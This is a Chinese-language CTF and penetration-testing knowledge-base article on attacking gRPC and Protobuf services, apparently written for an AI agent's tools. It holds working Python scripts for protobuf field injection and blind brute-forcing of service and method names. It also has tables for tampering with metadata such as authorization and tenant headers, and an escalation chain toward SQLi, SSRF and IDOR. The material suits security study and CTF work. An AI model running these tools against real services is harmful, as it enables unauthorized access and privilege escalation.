---
id: "general/protocol/03-grpc-protobuf"
title: "gRPC / Protobuf 攻击"
title_en: "gRPC and Protobuf Attacks"
summary: >
  gRPC/Protobuf 的关键不是只会改 Base64，而是还原 service/method/schema/metadata/compression/frame/field number 的完整 oracle。本篇覆盖 reflection 与盲枚举、gRPC-Web 解码、字段注入、unknown field 保留、metadata 认证差分、HTTP/2 trailer 状态、Protoscope 十六进制 diff 和 Evidence 模板。
summary_en: >
  gRPC/Protobuf work requires reconstructing service/method/schema/metadata/compression/frame/field-number oracles, not just editing Base64. Covers reflection and blind enumeration, gRPC-Web decoding, field injection, unknown-field preservation, metadata auth diffs, HTTP/2 trailer status, Protoscope hex diffs, and evidence templates.
board: "general"
category: "protocol"
signals: ["gRPC", "Protobuf", "field injection", "wire type", "varint", "reflection", "gRPC-Web", "Protoscope", "grpc-status"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["gRPC攻击", "Protobuf", "protobuf注入", "gRPC枚举", "grpc-web", "protoscope", "field injection", "HTTP/2"]
difficulty: "advanced"
tags: ["injection", "grpc", "protobuf", "microservices", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["general/protocol/02-protobuf-flatbuffers-reverse"]
---

# gRPC / Protobuf 攻击

gRPC 题面经常把 Web API 的输入藏进 HTTP/2 frame、metadata 和 Protobuf field number。要先知道“服务端到底解析了哪个字段”，再谈提权、越权、SSRF 或注入。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| `Content-Type: application/grpc` | 读 `grpc-status` trailer 和 method path | `INVALID_ARGUMENT` 指向方法存在 | 始终 `UNIMPLEMENTED` |
| gRPC-Web Base64 body | 解 frame + protobuf | 修改字段后响应状态变化 | 前端签名或压缩未处理 |
| reflection 开启 | 拉 service/method/schema | `AdminService/GetFlag` 等内部方法可见 | reflection 被禁，转盲枚举 |
| metadata 里有 token/tenant | 单变量改 `authorization/x-tenant` | method 可达性或数据域变化 | metadata 被网关固定 |
| proto 字段未知 | append field number | 后端新版本接收 unknown field | unknown field 被丢弃 |
| 错误含 field name/number | fuzz required/oneof/repeated | schema 反推成功 | 错误统一封装 |

## 工作流

```text
识别 gRPC/gRPC-Web 入口
  → 枚举 service/method 或拉 reflection
  → 解 frame/protobuf，建立 baseline hex diff
  → 逐字段注入/删除/类型变化
  → metadata、compression、deadline 单变量对比
  → 用 grpc-status/trailer/业务字段证明命中
```

## 0. 判定矩阵

| 层 | 变量 | 观察点 |
|---|---|---|
| HTTP/2 path | `/pkg.Service/Method` | `grpc-status`, `:status`, trailer message |
| gRPC frame | compression flag + length | 解码是否错位、服务端是否读 body |
| Protobuf field | field number + wire type + value | 业务字段、权限、错误文本 |
| metadata | auth/tenant/debug/deadline | 身份、租户、内部方法可达性 |
| gRPC-Web | Base64 frame + trailers | 浏览器代理是否转发差异 |

## 1. Frame 与 field 工具

```python
#!/usr/bin/env python3
import argparse
import base64
import json

def enc_varint(v):
    out = []
    while v > 0x7f:
        out.append((v & 0x7f) | 0x80)
        v >>= 7
    out.append(v)
    return bytes(out)

def field_key(num, wire):
    return enc_varint((num << 3) | wire)

def inject_varint(msg, num, value):
    return msg + field_key(num, 0) + enc_varint(value)

def inject_bytes(msg, num, value):
    b = value.encode() if isinstance(value, str) else value
    return msg + field_key(num, 2) + enc_varint(len(b)) + b

def grpc_frame(msg, compressed=0):
    return bytes([compressed]) + len(msg).to_bytes(4, "big") + msg

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--b64", help="grpc-web/base64 frame or raw protobuf")
    ap.add_argument("--hex", help="raw protobuf hex")
    ap.add_argument("--field", type=int, required=True)
    ap.add_argument("--wire", choices=["varint", "bytes"], default="varint")
    ap.add_argument("--value", required=True)
    ap.add_argument("--wrap-frame", action="store_true")
    args = ap.parse_args()
    raw = bytes.fromhex(args.hex) if args.hex else base64.b64decode(args.b64)
    if len(raw) > 5 and raw[0] in (0, 1) and int.from_bytes(raw[1:5], "big") == len(raw) - 5:
        raw = raw[5:]
    patched = inject_varint(raw, args.field, int(args.value)) if args.wire == "varint" else inject_bytes(raw, args.field, args.value)
    out = grpc_frame(patched) if args.wrap_frame else patched
    print(json.dumps({"hex": out.hex(), "base64": base64.b64encode(out).decode(), "diff_tail": out[-32:].hex()}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：只追加一个 field 后，`grpc-status`、业务字段、权限或 flag 响应变化。失败样本：`invalid wire type`、`message length mismatch`、所有 field number 同一错误。

## 2. 盲枚举 service/method

```python
#!/usr/bin/env python3
import argparse
import json
import requests

SERVICES = ["AuthService", "UserService", "AdminService", "FlagService", "InternalService", "ConfigService"]
METHODS = ["Login", "GetUser", "ListUsers", "GetFlag", "Admin", "Debug", "UpdateConfig", "Search"]

def call(base, svc, method, token=""):
    headers = {"Content-Type": "application/grpc", "TE": "trailers"}
    if token:
        headers["Authorization"] = token
    r = requests.post(f"{base.rstrip('/')}/{svc}/{method}", headers=headers, data=b"\x00\x00\x00\x00\x00", timeout=10)
    return {
        "service": svc,
        "method": method,
        "http": r.status_code,
        "grpc_status": r.headers.get("grpc-status", ""),
        "grpc_message": r.headers.get("grpc-message", ""),
        "sample": r.text[:120],
    }

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="https://host or http://host")
    ap.add_argument("--token", default="")
    args = ap.parse_args()
    for s in SERVICES:
        for m in METHODS:
            res = call(args.base, s, m, args.token)
            if res["grpc_status"] not in ("5", "12") or res["http"] not in (404, 501):
                print(json.dumps(res, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

判定：

| `grpc-status` | 解释 | 下一步 |
|---|---|---|
| `0` | 方法调用成功 | 读业务字段/flag |
| `3` | 方法存在，参数错误 | 反推 schema |
| `7/16` | 方法存在但身份不足 | metadata/token/tenant 差分 |
| `5/12` | 服务或方法不存在 | 换候选字典 |

## 3. Metadata 与 gRPC-Web 差分

| 变量 | Payload | 命中样本 |
|---|---|---|
| `authorization` | Bearer/JWT/API key/空值 | 身份或错误位置变化 |
| `x-tenant-id` | public/admin/internal | 数据域变化 |
| `x-debug` | `1`, `true` | 错误暴露 field name |
| `grpc-timeout` | 极小/极大 | 触发不同超时分支 |
| `x-grpc-web` | browser proxy headers | 代理层与后端差异 |

## 4. Protoscope / hexdiff

```bash
# 解 gRPC-Web body
python grpc_field_patch.py --b64 'AAAA...' --field 4 --wire varint --value 1 --wrap-frame

# 可读化 protobuf
echo '0a0561646d696e' | xxd -r -p | protoscope
```

保留修改前后 hex diff：`field_key`, `wire_type`, `length`, `value` 必须能复查。

## 攻击链

```text
gRPC 入口
  → reflection/盲枚举 service
  → schema/field number 反推
  → metadata 与 field 注入
  → 权限、租户、debug、flag 差异
  → 转 SQLi/SSRF/JWT/IDOR 下一跳
```

## Evidence

| 项 | 记录内容 |
|---|---|
| 入口 | path、content-type、HTTP/2/gRPC-Web、TLS、代理层 |
| 枚举 | service/method 候选、grpc-status、grpc-message |
| protobuf | 原始 frame、hex diff、field number、wire type、value |
| metadata | header/trailer、token/tenant/deadline 变量 |
| 成功样本 | 方法可达、权限变化、内部数据、flag、下游注入差异 |
| 失败样本 | length mismatch、unknown field dropped、统一 status |
| 下一跳 | 字段注入转 SQLi/SSRF/IDOR；token 转 JWT；服务枚举转 API discovery |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| 端点探测 | `http_probe` | 固定 gRPC path/header/body 变体 |
| 知识路由 | `kb_router` | 按 gRPC、protobuf、grpc-web、field injection 搜索 |
